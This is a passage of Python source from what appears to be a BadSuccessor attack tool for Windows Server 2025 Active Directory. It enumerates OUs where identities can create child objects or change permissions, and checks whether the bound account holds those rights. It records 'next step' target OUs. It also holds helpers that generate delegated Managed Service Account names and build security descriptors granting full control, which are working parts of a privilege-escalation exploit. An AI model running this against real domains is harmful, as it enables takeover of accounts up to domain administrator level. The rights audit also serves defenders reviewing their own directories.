                            prereq_flag = True
                            break
            else:
                logging.debug('Windows Server 2025 prerequisite check skipped.')

            if prereq_flag is False:
                logging.info('No Windows Server 2025 Domain Controllers found. This script requires at least one DC running Windows Server 2025.')
                logging.info('Resulting list of Identities/OUs will show Identities that have permissions to create objects in OUs.')
            elif prereq_flag is None:
                logging.debug('Windows Server 2025 prerequisite check was skipped.')

            ou_attributes = ['distinguishedName']
            ou_controls = None
            if self._search_include_sd:
                ou_attributes.append('nTSecurityDescriptor')
                ou_controls = security_descriptor_control(sdflags=0x5)

            search_base = self._target_ou or self._base_dn
            fallback_warning = ''
            if self._target_ou:
                logging.info('Restricting OU assessment to %s' % self._display_dn(self._target_ou))

            success = ldap_connection.search(
                search_base=search_base,
                search_filter='(objectClass=organizationalUnit)',
                search_scope=LDAP_SUBTREE,
                attributes=ou_attributes,
                controls=ou_controls
            )


            if not success:
                broad_result = ldap_connection.result
                if not self._target_ou:
                    fallback_ou = self._infer_authenticated_account_ou(ldap_connection)
                    if fallback_ou:
                        fallback_warning = 'Broad OU assessment failed; retried with inferred authenticated account OU.'
                        self._record_inference(
                            'target_ou',
                            'fallback',
                            'broad OU assessment failed, using authenticated account parent OU %s' % self._display_dn(fallback_ou),
                            level=logging.WARNING,
                        )
                        self._target_ou = fallback_ou
                        self._options.target_ou = fallback_ou
                        search_base = fallback_ou
                        logging.warning('%s %s' % (fallback_warning, self._display_dn(fallback_ou)))
                        success = ldap_connection.search(
                            search_base=search_base,
                            search_filter='(objectClass=organizationalUnit)',
                            search_scope=LDAP_SUBTREE,
                            attributes=ou_attributes,
                            controls=ou_controls
                        )

                if success:
                    logging.info('Fallback OU assessment succeeded at %s' % self._display_dn(search_base))
                else:
                    if broad_result is not None:
                        ldap_connection.result = broad_result
                    message = 'Failed to assess organizational units.'
                    logging.error('%s %s' % (message, ldap_connection.result))
                    self._set_report_failure('ou_search_failed', message, ldap_result=ldap_connection.result)
                    return False

            # Store the OU entries before they get overwritten by other searches
            ou_entries = list(ldap_connection.entries)
            logging.info('Found %d organizational units' % len(ou_entries))
            result_values = dict(
                mode='summary' if self._search_summary else 'security_descriptor_analysis',
                windows_server_2025_dc_found=prereq_flag,
                dc_prereq_warning=prereq_warning or '',
                search_fallback=fallback_warning,
                search_base=self._display_dn(search_base),
                ou_count=len(ou_entries),
            )
            self._set_report_result(**result_values)

            if self._search_summary:
                logging.info('Security descriptor analysis skipped. Pass --include-security-descriptor to inspect OU permissions.')
                logging.info('Name resolution skipped. Pass --resolve-names together with --include-security-descriptor to resolve matching SIDs.')
                return True

            # Get domain SID for filtering excluded accounts
            domain_sid = None
            try:
                success = ldap_connection.search(
                    search_base=self._base_dn,
                    search_filter='(objectClass=domain)',
                    search_scope=LDAP_BASE,
                    attributes=['objectSid']
                )

                if success and len(ldap_connection.entries) > 0:
                    entry = ldap_connection.entries[0]
                    if 'objectSid' in entry:
                        domain_sid = entry.objectSid.value
            except Exception as e:
                message = 'Failed to retrieve domain SID: %s' % str(e)
                logging.error(message)
                self._set_report_failure('domain_sid_lookup_failed', message)
                return False
            allowed_identities = {}

            relevant_rights = {
                "CreateChild": 0x00000001,
                "GenericAll": 0x10000000,
                "WriteDACL": 0x00040000,
                "WriteOwner": 0x00080000
            }

            relevant_object_types = {
                "00000000-0000-0000-0000-000000000000": "All Objects",
                "0feb936f-47b3-49f2-9386-1dedc2c23765": "msDS-DelegatedManagedServiceAccount",
            }
            allowed_ace_types = self._access_allowed_ace_types()

            def record_allowed_sid(sid, ou_dn):
                identity = self.resolve_sid_to_name(ldap_connection, sid) if self._search_resolve_names else sid
                if sid not in allowed_identities:
                    allowed_identities[sid] = {
                        'identity': identity,
                        'ous': [],
                    }
                if ou_dn not in allowed_identities[sid]['ous']:
                    allowed_identities[sid]['ous'].append(ou_dn)

            for entry in ou_entries:
                try:
                    ou_dn = str(entry.entry_dn)

                    if 'nTSecurityDescriptor' not in entry or not entry.nTSecurityDescriptor.value:
                        continue

                    sd_data = entry.nTSecurityDescriptor.value
                    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)

                    # Process DACL entries (ACEs)
                    dacl = sd['Dacl']
                    if dacl and hasattr(dacl, 'aces') and dacl.aces:
                        for ace in dacl.aces:
                            # Process ordinary allow ACEs and AD object-specific allow ACEs.
                            if self._ace_type_value(ace) not in allowed_ace_types:
                                continue

                            # Check if ACE has relevant rights
                            ace_data = ace['Ace']
                            mask = int(ace_data['Mask']['Mask'])
                            has_relevant_right = any(mask & right_value for right_value in relevant_rights.values())
                            if not has_relevant_right:
                                continue

                            # Check object type (must match relevant object types)
                            object_guid = self._ace_object_type_guid(ace_data)
                            if object_guid:
                                if object_guid not in relevant_object_types:
                                    continue

                            sid = ace_data['Sid'].formatCanonical()

                            if self.is_excluded_sid(sid, domain_sid):
                                continue

                            record_allowed_sid(sid, ou_dn)

                    try:
                        owner_sid = sd['OwnerSid'].formatCanonical()
                        if not self.is_excluded_sid(owner_sid, domain_sid):
                            record_allowed_sid(owner_sid, ou_dn)
                    except Exception as e:
                        logging.debug('Could not inspect owner SID for %s: %s' % (self._display_dn(ou_dn), e))

                except Exception as e:
                    logging.debug('Could not inspect OU security descriptor for %s: %s' % (self._display_dn(getattr(entry, 'entry_dn', '(unknown)')), e))
                    continue

            current_user = {
                'status': 'not_checked',
                'reason': 'no matching OU rights were found',
                'object_sid': None,
                'effective_sids': [],
                'token_groups_read': False,
                'sam_account_name': getattr(self, '_username', None),
            }
            if allowed_identities:
                try:
                    current_user = self.lookup_authenticated_effective_sids(ldap_connection)
                except Exception as e:
                    current_user = {
                        'status': 'unavailable',
                        'reason': str(e),
                        'object_sid': None,
                        'effective_sids': [],
                        'token_groups_read': False,
                        'sam_account_name': getattr(self, '_username', None),
                    }

                log_section('Findings')
                logging.info('Assessment result: found %d identities with %s.' % (len(allowed_identities), BADSUCCESSOR_RIGHTS_LABEL))
                logging.info('Rights evaluated: %s.' % BADSUCCESSOR_RIGHTS_MEANING)
                if current_user.get('status') == 'ok':
                    matched_sids = [
                        sid for sid in allowed_identities
                        if self._bound_user_match_status(sid, current_user) == 'yes'
                    ]
                    matched_count = len(matched_sids)
                    bound_account = current_user.get('sam_account_name') or getattr(self, '_username', None) or '(unknown)'
                    logging.info('Bound account: %s' % bound_account)
                    if matched_count:
                        logging.info('Bound account %s has BadSuccessor-relevant rights on the listed OUs.' % bound_account)
                        for sid in matched_sids:
                            logging.info('Matched effective SID: %s - %s' % (sid, self._effective_sid_source_label(sid, current_user)))
                    elif current_user.get('group_sids_resolved') or current_user.get('token_groups_read'):
                        logging.info('Bound account %s does not match the listed OU rights.' % bound_account)
                    else:
                        logging.info('Bound account %s rights could not be confirmed; group SID lookup did not return results.' % bound_account)
                else:
                    logging.info('Bound account rights could not be confirmed. %s' % current_user.get('reason', ''))
                log_blank()
                logging.info("%-50s %-13s %s" % ("Identity", "Bound account", "OUs with relevant rights"))
                logging.info("%-50s %-13s %s" % ("-" * 50, "-" * 13, "-" * 30))

                for sid, item in allowed_identities.items():
                    identity = item['identity']
                    ous = item['ous']
                    ou_list = "{%s}" % ", ".join([self._display_dn(ou) for ou in ous])
                    logging.info("%-50s %-13s %s" % (identity[:50], self._bound_user_match_display(sid, current_user), ou_list))
            else:
                log_section('Findings')
                logging.info('Assessment result: no identities found with %s.' % BADSUCCESSOR_RIGHTS_LABEL)
                log_blank()
                logging.info("%-50s %-13s %s" % ("Identity", "Bound account", "OUs with relevant rights"))
                logging.info("%-50s %-13s %s" % ("-" * 50, "-" * 13, "-" * 30))
                logging.info("%-50s %-13s %s" % ("(none)", "(none)", "(none)"))
            self._set_report_result(
                mode='security_descriptor_analysis',
                windows_server_2025_dc_found=prereq_flag,
                dc_prereq_warning=prereq_warning or '',
                search_base=self._display_dn(search_base),
                ou_count=len(ou_entries),
                identity_count=len(allowed_identities),
                rights_label=BADSUCCESSOR_RIGHTS_LABEL,
                rights_meaning=BADSUCCESSOR_RIGHTS_MEANING,
                bound_user=current_user,
                bound_account=current_user,
                bound_user_match_count=len([
                    sid for sid in allowed_identities
                    if self._bound_user_match_status(sid, current_user) == 'yes'
                ]),
                bound_account_match_count=len([
                    sid for sid in allowed_identities
                    if self._bound_user_match_status(sid, current_user) == 'yes'
                ]),
                identities=[
                    {
                        'sid': sid,
                        'identity': item['identity'],
                        'applies_to_bound_user': self._bound_user_match_status(sid, current_user),
                        'bound_account_match': self._bound_user_match_status(sid, current_user),
                        'bound_account_match_source': self._effective_sid_source_label(sid, current_user),
                        'ous': [self._display_dn(ou) for ou in item['ous']],
                    }
                    for sid, item in allowed_identities.items()
                ],
                names_resolved=self._search_resolve_names,
            )
            self.report.setdefault('result', {})['_next_step_candidates'] = [
                {
                    'identity': sid,
                    'target_ou': ou,
                }
                for sid, item in allowed_identities.items()
                if self._bound_user_match_status(sid, current_user) == 'yes'
                for ou in item['ous']
            ]
            return True

        except Exception as e:
            message = 'BadSuccessor assessment failed: %s' % str(e)
            logging.error(message)
            self._set_report_failure('search_exception', message)
            return False

    def is_excluded_sid(self, sid, domain_sid):
        excluded_sids = ["S-1-5-32-544", "S-1-5-18"]  # BUILTIN\Administrators, SYSTEM
        excluded_suffixes = ["-512", "-519"]  # Domain Admins, Enterprise Admins

        if sid in excluded_sids:
            return True

        if domain_sid and sid.startswith('%s-' % domain_sid):
            for suffix in excluded_suffixes:
                if sid.endswith(suffix):
                    return True

        return False

    def sid_to_ldap_filter_value(self, sid):
        try:
            ldap_sid = ldaptypes.LDAP_SID()
            ldap_sid.fromCanonical(str(sid))
            return ''.join(['\\%02x' % b for b in ldap_sid.getData()])
        except Exception as e:
            logging.debug('Could not convert SID %s to LDAP filter bytes: %s' % (self._display_sid(sid), e))
            return self._escape_filter_value(sid)

    def resolve_sid_to_name(self, ldap_connection, sid):
        try:
            # Handle well-known SIDs
            well_known_sids = {
                'S-1-1-0': 'Everyone',
                'S-1-5-11': 'NT AUTHORITY\\Authenticated Users',
                'S-1-5-32-544': 'BUILTIN\\Administrators',
                'S-1-5-32-545': 'BUILTIN\\Users',
                'S-1-5-32-546': 'BUILTIN\\Guests',
                'S-1-5-18': 'NT AUTHORITY\\SYSTEM',
                'S-1-5-19': 'NT AUTHORITY\\LOCAL SERVICE',
                'S-1-5-20': 'NT AUTHORITY\\NETWORK SERVICE',
                'S-1-3-0': 'CREATOR OWNER',
                'S-1-3-1': 'CREATOR GROUP',
                'S-1-5-9': 'NT AUTHORITY\\ENTERPRISE DOMAIN CONTROLLERS',
                'S-1-5-10': 'NT AUTHORITY\\SELF',
            }

            if sid in well_known_sids:
                return well_known_sids[sid]

            sid_filter_value = self.sid_to_ldap_filter_value(sid)
            success = ldap_connection.search(
                search_base=self._base_dn,
                search_filter='(objectSid=%s)' % sid_filter_value,
                search_scope=LDAP_SUBTREE,
                attributes=['sAMAccountName', 'distinguishedName']
            )

            if success and len(ldap_connection.entries) > 0:
                entry = ldap_connection.entries[0]
                if 'sAMAccountName' in entry:
                    username = entry.sAMAccountName.value
                    return '%s\\%s' % (self._domain.upper(), username)

            return sid

        except Exception as e:
            logging.debug('Error resolving SID %s: %s' % (self._display_sid(sid), str(e)))
            return sid

    def _sid_from_value(self, value):
        if value in (None, ''):
            return None
        if isinstance(value, str):
            value = value.strip()
            return value if validate_sid_syntax(value) else None
        if isinstance(value, (bytes, bytearray)):
            try:
                return ldaptypes.LDAP_SID(data=bytes(value)).formatCanonical()
            except Exception:
                return self.convert_sid_to_string(bytes(value))
        return None

    def _entry_sid_values(self, entry, attr_name):
        if attr_name not in entry:
            return []
        attr = entry[attr_name]
        values = []
        for value in list(getattr(attr, 'values', []) or []) + list(getattr(attr, 'raw_values', []) or []):
            sid = self._sid_from_value(value)
            if sid and sid not in values:
                values.append(sid)
        return values

    def _authenticated_account_names(self):
        username = str(self._username or '').strip()
        if not username:
            return []
        names = [username]
        if '@' not in username and self._domain:
            names.append('%s@%s' % (username, self._domain))
        if '@' not in username and not username.endswith('$'):
            names.append('%s$' % username)

        deduped = []
        seen = set()
        for name in names:
            lowered = name.lower()
            if lowered in seen:
                continue
            seen.add(lowered)
            deduped.append(name)
        return deduped

    def lookup_authenticated_effective_sids(self, ldap_connection):
        names = self._authenticated_account_names()
        if not names:
            return {
                'status': 'unavailable',
                'reason': 'authenticated username is not available',
                'object_sid': None,
                'effective_sids': [],
                'token_groups_read': False,
            }

        filter_terms = []
        for name in names:
            escaped = self._escape_filter_value(name)
            filter_terms.extend([
                '(sAMAccountName=%s)' % escaped,
                '(userPrincipalName=%s)' % escaped,
                '(cn=%s)' % escaped,
                '(name=%s)' % escaped,
            ])
        search_filter = '(&(|(objectClass=user)(objectClass=computer))(objectSid=*)(|%s))' % ''.join(filter_terms)

        attributes = [
            'objectSid',
            'sAMAccountName',
            'distinguishedName',
            'cn',
            'name',
            'userPrincipalName',
            'objectClass',
            'primaryGroupID',
        ]
        success = ldap_connection.search(
            search_base=self._base_dn,
            search_filter=search_filter,
            search_scope=LDAP_SUBTREE,
            attributes=attributes,
        )
        last_result = getattr(ldap_connection, 'result', None)
        if not success:
            return {
                'status': 'unavailable',
                'reason': 'authenticated account SID lookup failed: %s' % last_result,
                'object_sid': None,
                'effective_sids': [],
                'token_groups_read': False,
                'group_sids_resolved': False,
            }
        if not ldap_connection.entries:
            return {
                'status': 'unavailable',
                'reason': 'authenticated account was not found',
                'object_sid': None,
                'effective_sids': [],
                'token_groups_read': False,
                'group_sids_resolved': False,
            }

        entry, reason = self._select_account_entry(ldap_connection.entries, names)
        if entry is None:
            return {
                'status': 'unavailable',
                'reason': reason or 'authenticated account lookup was ambiguous',
                'object_sid': None,
                'effective_sids': [],
                'token_groups_read': False,
                'group_sids_resolved': False,
            }

        object_sids = self._entry_sid_values(entry, 'objectSid')
        object_sid = object_sids[0] if object_sids else None
        token_group_sids, token_groups_read = self._lookup_token_group_sids(ldap_connection, entry.entry_dn)
        recursive_group_sids = []
        recursive_groups_read = False
        if not token_groups_read:
            recursive_group_sids, recursive_groups_read = self._lookup_recursive_group_sids(ldap_connection, entry.entry_dn)

        primary_group_sid = self._primary_group_sid(object_sid, self._entry_value(entry, 'primaryGroupID'))
        effective_sids = []
        effective_sid_sources = {}
        for sid in object_sids + token_group_sids + recursive_group_sids + ([primary_group_sid] if primary_group_sid else []):
            if sid and sid not in effective_sids:
                effective_sids.append(sid)
            if sid and sid in object_sids:
                effective_sid_sources.setdefault(sid, 'direct account SID')
            elif sid and sid in token_group_sids:
                effective_sid_sources.setdefault(sid, 'group SID from tokenGroups')
            elif sid and sid in recursive_group_sids:
                effective_sid_sources.setdefault(sid, 'group SID from recursive membership')
            elif sid and sid == primary_group_sid:
                effective_sid_sources.setdefault(sid, 'primary group SID')

        if token_groups_read:
            group_sid_source = 'tokenGroups'
        elif recursive_groups_read:
            group_sid_source = 'recursive_group_membership'
        elif primary_group_sid:
            group_sid_source = 'primaryGroupID'
        else:
            group_sid_source = 'unavailable'

        return {
            'status': 'ok',
            'reason': '',
            'dn': self._display_dn(entry.entry_dn),
            'sam_account_name': self._entry_value(entry, 'sAMAccountName') or self._username,
            'object_sid': object_sid,
            'effective_sids': effective_sids,
            'effective_sid_sources': effective_sid_sources,
            'effective_sid_count': len(effective_sids),
            'token_groups_read': token_groups_read,
            'group_sids_resolved': token_groups_read or recursive_groups_read,
            'group_sid_source': group_sid_source,
        }

    def _bound_user_match_status(self, sid, current_user):
        if not sid or not current_user or current_user.get('status') != 'ok':
            return 'unknown'
        effective_sids = set(current_user.get('effective_sids') or [])
        if sid in effective_sids:
            return 'yes'
        if current_user.get('group_sids_resolved') or current_user.get('token_groups_read'):
            return 'no'
        return 'unknown'

    def _effective_sid_source_label(self, sid, current_user):
        if not sid or not current_user or current_user.get('status') != 'ok':
            return 'unknown'
        return (current_user.get('effective_sid_sources') or {}).get(sid, 'unknown')

    def _bound_user_match_display(self, sid, current_user):
        return self._bound_user_match_status(sid, current_user)

    def _lookup_token_group_sids(self, ldap_connection, account_dn):
        try:
            success = ldap_connection.search(
                search_base=str(account_dn),
                search_filter='(objectSid=*)',
                search_scope=LDAP_BASE,
                attributes=['tokenGroups'],
            )
            if not success or not ldap_connection.entries:
                return [], False
            entry = ldap_connection.entries[0]
            if 'tokenGroups' not in entry:
                return [], False
            return self._entry_sid_values(entry, 'tokenGroups'), True
        except Exception as e:
            logging.debug('Could not read tokenGroups for %s: %s' % (self._display_dn(account_dn), e))
            return [], False

    def _lookup_recursive_group_sids(self, ldap_connection, account_dn):
        try:
            escaped_dn = self._escape_filter_value(account_dn)
            search_filter = '(&(objectClass=group)(objectSid=*)(member:1.2.840.113556.1.4.1941:=%s))' % escaped_dn
            success = ldap_connection.search(
                search_base=self._base_dn,
                search_filter=search_filter,
                search_scope=LDAP_SUBTREE,
                attributes=['objectSid', 'sAMAccountName', 'distinguishedName', 'objectClass'],
            )
            if not success:
                return [], False
            group_sids = []
            for entry in ldap_connection.entries:
                for sid in self._entry_sid_values(entry, 'objectSid'):
                    if sid not in group_sids:
                        group_sids.append(sid)
            return group_sids, True
        except Exception as e:
            logging.debug('Could not read recursive group membership for %s: %s' % (self._display_dn(account_dn), e))
            return [], False

    def _primary_group_sid(self, object_sid, primary_group_id):
        if not object_sid or primary_group_id in (None, ''):
            return None
        try:
            rid = int(str(primary_group_id))
        except (TypeError, ValueError):
            return None
        parts = str(object_sid).split('-')
        if len(parts) < 2:
            return None
        return '%s-%d' % ('-'.join(parts[:-1]), rid)


    def generate_dmsa_name(self):
        random_suffix = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        return 'dMSA-%s' % random_suffix

    def convert_sid_to_string(self, sid_bytes):
        try:
            if not sid_bytes:
                return None

            if isinstance(sid_bytes, str):
                sid_bytes = sid_bytes.encode('latin-1')

            if len(sid_bytes) < 8:
                return None

            revision = sid_bytes[0]
            authority_count = sid_bytes[1]

            expected_length = 8 + (authority_count * 4)
            if len(sid_bytes) < expected_length:
                return None

            authority = int.from_bytes(sid_bytes[2:8], 'big')

            subauthorities = []
            for i in range(authority_count):
                offset = 8 + (i * 4)
                if offset + 4 <= len(sid_bytes):
                    subauth = int.from_bytes(sid_bytes[offset:offset+4], 'little')
                    subauthorities.append(str(subauth))
                else:
                    break

            if subauthorities:
                sid_string = 'S-%d-%d-%s' % (revision, authority, '-'.join(subauthorities))
            else:
                sid_string = 'S-%d-%d' % (revision, authority)

            return sid_string

        except Exception as e:
            logging.debug('Error converting SID bytes to string: %s' % str(e))
            return None

    def _escape_filter_value(self, value):
        return escape_filter_chars(value)

    def _looks_like_dn(self, value):
        value = str(value)
        return '=' in value and ',' in value

    def _account_candidate_names(self, account):
        names = []
        account = str(account).strip()
        if account:
            names.append(account)
        if '@' not in account and not account.endswith('$'):
            names.append('%s$' % account)
        return names

    def _entry_object_classes(self, entry):
        if 'objectClass' not in entry:
            return []
        return [str(oc).lower() for oc in entry.objectClass.values]

    def _account_entry_is_user_or_computer(self, entry):
        object_classes = self._entry_object_classes(entry)
        return 'user' in object_classes or 'computer' in object_classes

    def _principal_entry_is_supported(self, entry):
        if 'objectSid' not in entry or not entry.objectSid.value:
            return False
        object_classes = self._entry_object_classes(entry)
        return 'user' in object_classes or 'computer' in object_classes or 'group' in object_classes

    def _select_account_entry(self, entries, candidate_names):
        usable_entries = [entry for entry in entries if self._account_entry_is_user_or_computer(entry)]
        if not usable_entries:
            return None, 'no user/computer entries'

        lowered_names = [name.lower() for name in candidate_names]
        for attr in ('sAMAccountName', 'userPrincipalName', 'cn', 'name'):
            exact_matches = []
            for entry in usable_entries:
                value = self._entry_value(entry, attr)
                if value and str(value).lower() in lowered_names:
                    exact_matches.append(entry)
            if len(exact_matches) == 1:
                if len(usable_entries) > 1:
                    self._record_inference(
                        'target_account',
                        'selected',
                        'exact %s match selected from %d LDAP candidates' % (attr, len(usable_entries)),
                    )
                return exact_matches[0], None
            if len(exact_matches) > 1:
                return None, 'multiple exact %s matches' % attr

        if len(usable_entries) == 1:
            return usable_entries[0], None

        return None, 'ambiguous LDAP lookup returned %d user/computer candidates; use a full DN' % len(usable_entries)

    def _select_principal_entry(self, entries, candidate_names):
        usable_entries = [entry for entry in entries if self._principal_entry_is_supported(entry)]
        if not usable_entries:
            return None, 'no user/computer/group entries with objectSid'

        lowered_names = [name.lower() for name in candidate_names]
        for attr in ('sAMAccountName', 'userPrincipalName', 'cn', 'name'):
            exact_matches = []
            for entry in usable_entries:
                value = self._entry_value(entry, attr)
                if value and str(value).lower() in lowered_names:
                    exact_matches.append(entry)
            if len(exact_matches) == 1:
                if len(usable_entries) > 1:
                    self._record_inference(
                        'principals_allowed',
                        'selected',
                        'exact %s match selected from %d LDAP candidates' % (attr, len(usable_entries)),
                    )
                return exact_matches[0], None
            if len(exact_matches) > 1:
                return None, 'multiple exact %s matches' % attr

        if len(usable_entries) == 1:
            return usable_entries[0], None

        return None, 'ambiguous LDAP lookup returned %d user/computer/group candidates; use a SID or full DN' % len(usable_entries)

    def _common_account_dn_candidates(self, account):
        if not self._base_dn:
            return []
        account = str(account or '').strip()
        if not account or self._looks_like_dn(account) or '@' in account or '\\' in account:
            return []

        sam = account.rstrip('$')
        if not sam:
            return []

        cn = escape_dn_value(sam)
        candidates = [
            'CN=%s,CN=Users,%s' % (cn, self._base_dn),
            'CN=%s,CN=Computers,%s' % (cn, self._base_dn),
        ]
        deduped = []
        seen = set()
        for candidate in candidates:
            normalized = normalize_dn(candidate)
            if normalized in seen:
                continue
            seen.add(normalized)
            if self._scope_base_dn and not dn_in_scope(candidate, self._scope_base_dn):
                continue
            deduped.append(candidate)
        return deduped

    def _target_account_usage_hint(self, account):
        if self._dmsa_name_supplied:
            return ''
        if not account or self._looks_like_dn(account):
            return ''
        if not validate_dmsa_name(account):
            return ''
        normalized = normalized_dmsa_name(account)
        return (
            'If "%s" is the new dMSA name, use --dmsa-name %s and set '
            '--target-account to the existing user/computer to be linked.'
        ) % (account, normalized)

    def _lookup_account_dn_candidate(self, ldap_connection, candidate_dn):
        success = ldap_connection.search(
            search_base=candidate_dn,
            search_filter='(|(objectClass=user)(objectClass=computer))',
            search_scope=LDAP_BASE,
            attributes=['distinguishedName', 'objectClass', 'sAMAccountName', 'cn', 'name', 'userPrincipalName']
        )
        if success and len(ldap_connection.entries) > 0:
            entry, reason = self._select_account_entry(ldap_connection.entries, [candidate_dn])
            if entry is not None:
                return str(entry.entry_dn)
            logging.debug('Account DN candidate was ambiguous or unusable: %s (%s)' % (self._display_dn(candidate_dn), reason))
        elif self._ldap_result_is_no_such_object(ldap_connection.result):
            logging.debug('Account DN candidate did not exist: %s' % self._display_dn(candidate_dn))
        else:
            logging.debug('Account DN candidate lookup failed for %s: %s' % (self._display_dn(candidate_dn), ldap_connection.result))
        return None

    def resolve_principal_sid(self, ldap_connection, principal):
        """Resolve a user, computer, group, DN, or raw SID to a canonical SID."""
        self._last_principal_error = None
        if not principal:
            return None

        principal = str(principal).strip()

        if principal.upper().startswith('S-1-'):
            return principal

        searches = []
        if self._looks_like_dn(principal):
            searches.append((principal, LDAP_BASE, '(objectSid=*)', [principal]))
        else:
            candidate_names = [principal]
            if '@' not in principal and not principal.endswith('$'):
                candidate_names.append('%s$' % principal)

            for name in candidate_names:
                esc = self._escape_filter_value(name)
                searches.append((
                    self._base_dn,
                    LDAP_SUBTREE,
                    '(&(|(objectClass=user)(objectClass=computer)(objectClass=group))(objectSid=*)(|(sAMAccountName=%s)(cn=%s)(name=%s)(userPrincipalName=%s)))' % (esc, esc, esc, esc),
                    candidate_names,
                ))

        for search_base, search_scope, search_filter, names in searches:
            logging.debug('Resolving principals-allowed with base=%s filter=principal lookup' % self._display_dn(search_base))
            success = ldap_connection.search(
                search_base=search_base,
                search_filter=search_filter,
                search_scope=search_scope,
                attributes=['objectSid', 'sAMAccountName', 'distinguishedName', 'cn', 'name', 'userPrincipalName', 'objectClass']
            )
            logging.debug('Principal resolve result: success=%s entries=%d result=%s' % (success, len(ldap_connection.entries), ldap_connection.result))
            if success and len(ldap_connection.entries) > 0:
                for entry in ldap_connection.entries:
                    logging.debug('Principal candidate DN: %s' % self._display_dn(entry.entry_dn))
                entry, reason = self._select_principal_entry(ldap_connection.entries, names)
                if entry is not None:
                    return entry.objectSid.value
                self._last_principal_error = reason
                logging.warning('Principals-allowed lookup was ambiguous or unusable: %s' % reason)
                return None

        return None

    def resolve_account_dn(self, ldap_connection, account):
        """Resolve a user/computer account name or DN to a distinguishedName."""
        self._last_target_account_error = None
        if not account:
            return None

        account = str(account).strip()

        if self._looks_like_dn(account):
            success = ldap_connection.search(
                search_base=account,
                search_filter='(|(objectClass=user)(objectClass=computer))',
                search_scope=LDAP_BASE,
                attributes=['distinguishedName', 'objectClass', 'sAMAccountName', 'cn', 'name', 'userPrincipalName']
            )
            if success and len(ldap_connection.entries) > 0:
                return str(ldap_connection.entries[0].entry_dn)
            logging.error('Target account DN was not found or is not a user/computer: %s' % self._display_dn(account))
            return None

        names = self._account_candidate_names(account)

        filters = []
        for name in names:
            esc = self._escape_filter_value(name)
            filters.extend([
                '(&(|(objectClass=user)(objectClass=computer))(|(sAMAccountName=%s)(cn=%s)(name=%s)(userPrincipalName=%s)))' % (esc, esc, esc, esc),
                '(&(objectCategory=person)(objectClass=user)(|(sAMAccountName=%s)(cn=%s)(name=%s)(userPrincipalName=%s)))' % (esc, esc, esc, esc),
                '(&(objectClass=computer)(|(sAMAccountName=%s)(cn=%s)(name=%s)))' % (esc, esc, esc),
            ])

        for search_filter in filters:
            logging.debug('Resolving target account with base=%s filter=target account lookup' % self._display_dn(self._base_dn))
            success = ldap_connection.search(
                search_base=self._base_dn,
                search_filter=search_filter,
                search_scope=LDAP_SUBTREE,
                attributes=['distinguishedName', 'objectClass', 'sAMAccountName', 'cn', 'name', 'userPrincipalName']
            )
            logging.debug('Resolve result: success=%s entries=%d result=%s' % (success, len(ldap_connection.entries), ldap_connection.result))

            if success and len(ldap_connection.entries) > 0:
                entry, reason = self._select_account_entry(ldap_connection.entries, names)
                if entry is not None:
                    return str(entry.entry_dn)
                self._last_target_account_error = reason
                logging.warning('Target account lookup was ambiguous: %s' % reason)
                self._set_report_failure('target_account_ambiguous', 'Target account lookup was ambiguous.', target_account=self._display_value(account), detail=reason)
                return None

        for candidate_dn in self._common_account_dn_candidates(account):
            self._record_inference('target_account', 'try', 'checking exact DN candidate %s' % self._display_dn(candidate_dn))
            resolved_dn = self._lookup_account_dn_candidate(ldap_connection, candidate_dn)
            if resolved_dn:
                self._record_inference('target_account', 'selected', 'exact DN candidate %s' % self._display_dn(resolved_dn))
                return resolved_dn

        return None

    def build_security_descriptor(self, user_sid):
        try:
            if not user_sid:
                return None
            # Handle both string and bytes SID formats
            if isinstance(user_sid, str):
                if user_sid.startswith('S-'):
                    sid_string = user_sid
                else:
                    return None
            else:
                sid_string = self.convert_sid_to_string(user_sid)
                if not sid_string:
                    return None
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
            sd['Revision'] = b'\x01'
            sd['Sbz1'] = b'\x00'
            sd['Control'] = 32772
            sd['OwnerSid'] = ldaptypes.LDAP_SID()
            sd['OwnerSid'].fromCanonical(sid_string)
            sd['GroupSid'] = b''
            sd['Sacl'] = b''
            acl = ldaptypes.ACL()
            acl['AclRevision'] = 4
            acl['Sbz1'] = 0
            acl['Sbz2'] = 0
            acl.aces = []

            nace1 = ldaptypes.ACE()
            nace1['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
            nace1['AceFlags'] = 0x00
            acedata1 = ldaptypes.ACCESS_ALLOWED_ACE()
            acedata1['Mask'] = ldaptypes.ACCESS_MASK()
            acedata1['Mask']['Mask'] = 0x000F01FF
            acedata1['Sid'] = ldaptypes.LDAP_SID()
            acedata1['Sid'].fromCanonical(sid_string)
            nace1['Ace'] = acedata1
            acl.aces.append(nace1)

            nace2 = ldaptypes.ACE()
            nace2['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
            nace2['AceFlags'] = 0x00
            acedata2 = ldaptypes.ACCESS_ALLOWED_ACE()
            acedata2['Mask'] = ldaptypes.ACCESS_MASK()
            acedata2['Mask']['Mask'] = 0x10000000  # GenericAll
            acedata2['Sid'] = ldaptypes.LDAP_SID()
            acedata2['Sid'].fromCanonical(sid_string)
            nace2['Ace'] = acedata2
            acl.aces.append(nace2)
            sd['Dacl'] = acl
            return sd.getData()
        except Exception as e:
            logging.debug('Error building security descriptor: %s' % str(e))
            return None



    def _entry_value(self, entry, attr_name):
        try:
            if attr_name in entry:
                return entry[attr_name].value
        except Exception:
            pass
        return None

    def _infer_authenticated_account_ou(self, ldap_connection):
        account = str(self._username or '').strip()
        if not account or not self._base_dn:
            return None

        names = self._account_candidate_names(account)
        for name in names:
            esc = self._escape_filter_value(name)
            search_filter = '(&(|(objectClass=user)(objectClass=computer))(sAMAccountName=%s))' % esc
            success = ldap_connection.search(
                search_base=self._base_dn,
                search_filter=search_filter,
                search_scope=LDAP_SUBTREE,
                attributes=['distinguishedName', 'sAMAccountName']
            )
            if not success or not ldap_connection.entries:
                continue

            if len(ldap_connection.entries) != 1:
                logging.debug('Could not infer account OU from authenticated account: expected one exact sAMAccountName match, got %d' % len(ldap_connection.entries))
                return None

            entry = ldap_connection.entries[0]
            parent_ou = parent_ou_from_dn(str(entry.entry_dn))
            if not parent_ou:
                logging.debug('Authenticated account is not directly under an OU: %s' % self._display_dn(entry.entry_dn))
                return None
            if self._scope_base_dn and not dn_in_scope(parent_ou, self._scope_base_dn):
                logging.debug('Inferred account OU is outside scope: %s' % self._display_dn(parent_ou))
                return None
            return parent_ou

        return None

    def _dn_equal(self, left, right):
